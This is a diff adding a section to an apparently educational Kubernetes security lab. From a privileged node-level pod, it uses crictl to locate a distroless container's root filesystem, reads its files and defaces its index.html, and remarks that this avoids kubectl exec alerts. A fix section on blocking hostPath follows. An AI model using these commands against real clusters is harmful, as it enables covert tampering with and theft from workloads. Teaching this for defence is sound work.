@@ -120,6 +120,44 @@ Since we have `privileged` access and `hostPID`, we can jump into the Node's **N
 
     *Try generating some traffic in another terminal (e.g., `kubectl run curl --image=curlimages/curl -- curl http://demo-app.battleground.svc`) and watch the packets flow!*
 
+### 3.5. Direct Filesystem Access (Bypassing "Distroless")
+
+Sometimes you want to inspect a pod's files, but the pod is "distroless" (no shell, no ls, no cat) or you don't want to trigger an alert by running `kubectl exec`.
+
+Since we are on the Node, we can find where the container's filesystem is stored on the host and access it directly!
+
+1.  **Find the Container ID:**
+    We need the Container ID of the target pod (e.g., `demo-app`).
+    ```bash
+    # Use crictl to find the container ID for 'demo-app'
+    chroot /host crictl ps --name demo-app
+    ```
+    *Copy the CONTAINER ID (e.g., `a1b2c3d4e5...`).*
+
+2.  **Find the Mount Point:**
+    Inspect the container to find its root filesystem path.
+    ```bash
+    # Replace <CONTAINER_ID> with the actual ID
+    chroot /host crictl inspect <CONTAINER_ID> | grep "mergedDir"
+    ```
+    You will see something like: `"mergedDir": "/var/lib/containerd/io.containerd.grpc.v1.cri/sandboxes/.../rootfs"`
+
+3.  **Access the Files:**
+    Now you can just `cd` into that directory (prefixed with `/host` since we mounted the host root there).
+
+    ```bash
+    # Example (adjust path based on output above):
+    ls -l /host/var/lib/containerd/.../rootfs/usr/share/nginx/html/
+    
+    # Modify the index.html directly!
+    echo "<h1>Hacked by Node Admin</h1>" > /host/var/lib/containerd/.../rootfs/usr/share/nginx/html/index.html
+    ```
+
+    **Impact:**
+    - Read sensitive configuration files without entering the pod.
+    - Modify application code or static assets (Defacement).
+    - Inject malware into running containers.
+
 ## 4. Fix
 
 - **Restrict HostPath:** Use Policy (PSS/OPA) to block `hostPath` mounts, especially for `/`, `/etc`, and `/var`.
